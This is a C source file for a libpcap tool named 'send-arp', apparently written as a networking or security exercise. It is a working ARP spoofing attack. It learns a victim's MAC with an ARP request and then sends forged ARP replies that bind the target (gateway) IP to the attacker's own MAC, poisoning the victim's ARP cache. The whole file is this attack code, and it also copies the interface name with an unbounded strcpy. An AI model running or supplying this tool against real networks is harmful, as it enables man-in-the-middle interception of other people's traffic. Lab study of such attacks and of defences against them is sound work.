#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <libnet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <net/if_arp.h>

typedef struct {
    uint8_t dmac[6];
    uint8_t smac[6];
    uint16_t type;
} eth_header;

typedef struct {
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_size;
    uint8_t protocol_size;
    uint16_t opcode;
    uint8_t smac[6];
    uint8_t sip[4];
    uint8_t tmac[6];
    uint8_t tip[4];
} arp_header;

typedef struct {
    eth_header eth;
    arp_header arp;
} arp_packet;

uint8_t my_ip[4];
uint8_t my_mac[6];

void usage() {
    puts("syntax: ./send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
    puts("sample: ./send-arp ens33 192.168.0.5 192.168.0.1");
}

int get_mac_address(char *interface, uint8_t *mac) {
    int s;
	struct ifreq buffer;

	s = socket(PF_INET, SOCK_DGRAM, 0);

	memset(&buffer, 0x00, sizeof(buffer));
	strcpy(buffer.ifr_name, interface);

	int result = ioctl(s, SIOCGIFHWADDR, &buffer);
	close(s);

    if (result != 0)
        return result;
	
	for( s = 0; s < 6; s++ )
		mac[s] = (unsigned char)buffer.ifr_hwaddr.sa_data[s];

    return result;
}

void get_my_info(char *dev) {
    struct ifreq my_info;
    int sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(my_info.ifr_name, dev);
    ioctl(sock, SIOCGIFHWADDR, &my_info);
    for (int i = 0; i < 6; i++) {
        my_mac[i] = (unsigned char) my_info.ifr_ifru.ifru_hwaddr.sa_data[i];
    }

    ioctl(sock, SIOCGIFADDR, &my_info);
    for (int i = 2; i < 6; i++) {
        my_ip[i - 2] = (unsigned char)my_info.ifr_ifru.ifru_addr.sa_data[i];
    }
    
    close(sock);
}

int ip_valid_check(char* ip) {
    char* ptr = ip;
    char* ptr_tmp;

    for (int i = 0; i < 4; i++) {
        if (i != 3) {
            ptr_tmp = strchr(ptr, '.');
            if (ptr_tmp == NULL) return -1;
        }
        else ptr_tmp = ip + strlen(ip);

        if (ptr_tmp - ptr < 1 || ptr_tmp - ptr > 3) return -1;

        for (char* j = ptr; j < ptr_tmp; j++)
            if (j[0] > '9' || j[0] < '0') return -1;

        ptr = ptr_tmp + 1;
    }

    return 0;
}

unsigned int str_to_ip(char* ip) {
    unsigned int ip_int = 0;
    char* ptr = ip;

    for (int i = 0; i < 4; i++) {
        ip_int += atoi(ptr) << (8 * i);
        if (i != 3) ptr = strchr(ptr, '.') + 1;
    }

    return ip_int;
}

void print_ip(uint8_t *ip) {
    for (int i = 0; i < 4; i++) {
        printf("%d", ip[i]);
        if (i != 3) printf(".");
    }
    printf("\n");
}

void print_mac(char *mac) {
    for (int i = 0; i < 6; i++) {
        printf("%02x", (unsigned char)mac[i]);
        if (i != 5) printf(":");
    }
    printf("\n");
}

int send_arp_packet(pcap_t *handle, uint8_t *eth_smac, uint8_t *eth_dmac, uint8_t *arp_smac, uint8_t *arp_sip, uint8_t *arp_tmac, uint8_t *arp_tip, uint16_t opcode) {
    eth_header eth;
    arp_header arp;

    memcpy(eth.dmac, eth_dmac, 6);
    memcpy(eth.smac, eth_smac, 6);
    eth.type = htons(ETHERTYPE_ARP);

    arp.hardware_type = htons(ARPHRD_ETHER);
    arp.protocol_type = htons(ETHERTYPE_IP);
    arp.hardware_size = 6;
    arp.protocol_size = 4;
    arp.opcode = htons(opcode);
    memcpy(arp.smac, arp_smac, 6);
    memcpy(arp.sip, arp_sip, 4);
    memcpy(arp.tmac, arp_tmac, 6);
    memcpy(arp.tip, arp_tip, 4);

    arp_packet packet = {eth, arp};

    return pcap_sendpacket(handle, (const u_char*)&packet, sizeof(arp_packet));
}

int packet_arp_check(const u_char *ptr) {
    arp_packet *packet = ptr;

    if (packet->eth.type != htons(ETHERTYPE_ARP)) return -1;
    if (packet->arp.hardware_type != htons(ARPHRD_ETHER)) return -1;
    if (packet->arp.protocol_type != htons(ETHERTYPE_IP)) return -1;
    if (packet->arp.opcode != htons(ARPOP_REPLY)) return -1;

    return 0;
}

int main (int argc, char *argv[])
{
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    for (int i = 2; i < argc; i++)
        if (ip_valid_check(argv[i]) != 0) {
            usage();
            return -1;
        }

    get_my_info(argv[1]);

    for (int i = 0; i < argc / 2 - 1; i++) {
        uint8_t sender_ip[4];
        uint8_t target_ip[4];

        *(unsigned int *)sender_ip = str_to_ip(argv[i * 2 + 2]);
        *(unsigned int *)target_ip = str_to_ip(argv[i * 2 + 3]);

        char* dev = argv[1];
	    char errbuf[PCAP_ERRBUF_SIZE];
	    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	    if (handle == NULL) {
		    fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		    return -1;
        }

        uint8_t broadcast_dmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
        uint8_t arp_request_tmac[6] = { 0, };

        int res = send_arp_packet(handle, my_mac, broadcast_dmac, my_mac, my_ip, arp_request_tmac, sender_ip, ARPOP_REQUEST);
        if (res != 0)
		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));

        const u_char* packet;
        while (1) {
            struct pcap_pkthdr* header;
            res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }
            if (packet_arp_check(packet) == 0) break;
        }

        arp_packet *arp_packet = packet;
        uint8_t sender_mac[6] = { 0, };
        memcpy(sender_mac, arp_packet->eth.smac, 6);

        res = send_arp_packet(handle, my_mac, sender_mac, my_mac, target_ip, sender_mac, sender_ip, ARPOP_REPLY);
        if (res != 0)
		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

	return 0;
}